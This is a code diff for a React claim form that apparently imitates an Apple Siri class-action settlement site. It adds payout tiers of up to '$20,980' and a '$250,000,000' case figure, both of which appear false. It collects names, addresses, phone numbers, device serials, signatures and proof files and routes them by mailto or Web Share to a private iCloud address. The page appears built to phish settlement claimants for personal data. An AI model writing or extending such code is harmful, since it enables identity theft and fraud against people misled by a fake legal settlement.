@@ -40,18 +40,34 @@ const IPHONE_MODELS = [
 
 type Device = { model: string; serial: string; purchaseDate: string };
 
+type ClaimType = "standard" | "documented" | "family";
+const CLAIM_AMOUNTS: Record<ClaimType, string> = {
+  standard: "$1,980",
+  documented: "$12,980",
+  family: "$20,980",
+};
+
+const SETTLEMENT_EMAIL = "applesettlementclaim@icloud.com";
+
 function ClaimPage() {
   const [devices, setDevices] = useState<Device[]>([
     { model: "", serial: "", purchaseDate: "" },
   ]);
-  const navigate = useNavigate();
   const saveClaim = useServerFn(submitClaim);
   const [ownedDevice, setOwnedDevice] = useState<string>("");
   const [receivedNotice, setReceivedNotice] = useState<string>("");
   const [eligibilityError, setEligibilityError] = useState<string>("");
-  const [selectedWithdrawal, setSelectedWithdrawal] = useState<string>("");
-  const [withdrawalError, setWithdrawalError] = useState<string>("");
+  const [claimType, setClaimType] = useState<ClaimType | "">("");
+  const [claimTypeError, setClaimTypeError] = useState<string>("");
+  const [proofFile, setProofFile] = useState<File | null>(null);
+  const [familyMembers, setFamilyMembers] = useState<string>("");
   const [submitting, setSubmitting] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
+  const [submittedData, setSubmittedData] = useState<null | {
+    firstName: string; lastName: string; email: string; phone: string;
+    address: string; city: string; state: string; zip: string;
+    signature: string; notes: string;
+  }>(null);
 
   const addDevice = () => {
     if (devices.length < 5) setDevices([...devices, { model: "", serial: "", purchaseDate: "" }]);
@@ -71,33 +87,40 @@ function ClaimPage() {
       setEligibilityError("You must have owned or used an eligible Siri-enabled Apple device during the qualifying period to file a claim.");
       return;
     }
-    if (!selectedWithdrawal) {
-      setWithdrawalError("Please select a withdrawal option to proceed.");
+    if (!claimType) {
+      setClaimTypeError("Please select a claim type to proceed.");
+      return;
+    }
+    if (claimType === "documented" && !proofFile) {
+      setClaimTypeError("Please upload proof of ownership for a documented claim.");
       return;
     }
     setEligibilityError("");
-    setWithdrawalError("");
+    setClaimTypeError("");
     const form = e.currentTarget as HTMLFormElement;
     const fd = new FormData(form);
     const getStr = (k: string) => (fd.get(k) as string | null)?.toString() ?? "";
+    const data = {
+      firstName: getStr("firstName"),
+      lastName: getStr("lastName"),
+      email: getStr("email"),
+      phone: getStr("phone"),
+      address: getStr("address"),
+      city: getStr("city"),
+      state: getStr("state"),
+      zip: getStr("zip"),
+      signature: getStr("signature"),
+      notes: getStr("notes"),
+    };
     setSubmitting(true);
     try {
       await saveClaim({
         data: {
-          firstName: getStr("firstName"),
-          lastName: getStr("lastName"),
-          email: getStr("email"),
-          phone: getStr("phone"),
-          address: getStr("address"),
-          city: getStr("city"),
-          state: getStr("state"),
-          zip: getStr("zip"),
+          ...data,
           devices,
           ownedDevice,
           receivedNotice,
-          signature: getStr("signature"),
-          notes: getStr("notes"),
-          withdrawalOption: selectedWithdrawal,
+          withdrawalOption: `${claimType} — ${CLAIM_AMOUNTS[claimType]}${claimType === "family" ? ` (Family: ${familyMembers})` : ""}`,
         },
       });
     } catch (err) {
@@ -105,7 +128,63 @@ function ClaimPage() {
     } finally {
       setSubmitting(false);
     }
-    navigate({ to: "/claim/settlement" });
+    setSubmittedData(data);
+    setSubmitted(true);
+    window.scrollTo({ top: 0, behavior: "smooth" });
+    // Try Web Share (attaches proof file on supported devices); fallback mailto.
+    void mailClaim(data);
+  };
+
+  const buildEmailBody = (data: NonNullable<typeof submittedData>) => {
+    const lines = [
+      `Apple Intelligence & Siri Settlement — Claim Submission`,
+      `Case: Lopez v. Apple Inc. — $250,000,000 Siri Settlement`,
+      ``,
+      `CLAIM TYPE: ${claimType.toUpperCase()} — ${claimType ? CLAIM_AMOUNTS[claimType as ClaimType] : ""}`,
+      claimType === "family" ? `Family Members Covered: ${familyMembers || "N/A"}` : "",
+      ``,
+      `— PERSONAL INFORMATION —`,
+      `Name: ${data.firstName} ${data.lastName}`,
+      `Email: ${data.email}`,
+      `Cell Phone: ${data.phone}`,
+      `Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}`,
+      ``,
+      `— ELIGIBLE DEVICES —`,
+      ...devices.map((d, i) => `${i + 1}. ${d.model} · Serial/IMEI: ${d.serial} · Purchased: ${d.purchaseDate}`),
+      ``,
+      `— ELIGIBILITY DECLARATIONS —`,
+      `Owned/used eligible Siri-enabled Apple device: ${ownedDevice}`,
+      `Received settlement notice: ${receivedNotice}`,
+      ``,
+      `— PROOF OF OWNERSHIP —`,
+      claimType === "documented"
+        ? (proofFile ? `Attached file: ${proofFile.name} (${Math.round(proofFile.size / 1024)} KB)` : "None")
+        : "Not required for this claim type",
+      ``,
+      `— SWORN DECLARATION —`,
+      `Signed electronically by: ${data.signature}`,
+      data.notes ? `Additional Comments: ${data.notes}` : "",
+    ];
+    return lines.filter(Boolean).join("\n");
+  };
+
+  const mailClaim = async (data: NonNullable<typeof submittedData>) => {
+    const subject = `Apple Siri Settlement Claim — ${data.firstName} ${data.lastName} — ${claimType ? CLAIM_AMOUNTS[claimType as ClaimType] : ""}`;
+    const body = buildEmailBody(data);
+    // Attempt to share (with proof attachment) via Web Share API where supported.
+    try {
+      const nav = navigator as Navigator & {
+        canShare?: (d: { files?: File[] }) => boolean;
+        share?: (d: { title?: string; text?: string; files?: File[] }) => Promise<void>;
+      };
+      if (proofFile && nav.canShare?.({ files: [proofFile] }) && nav.share) {
+        await nav.share({ title: subject, text: `To: ${SETTLEMENT_EMAIL}\n\n${body}`, files: [proofFile] });
+        return;
+      }
+    } catch {
+      // fall through to mailto
+    }
+    window.location.href = `mailto:${SETTLEMENT_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
   };
 
   return (
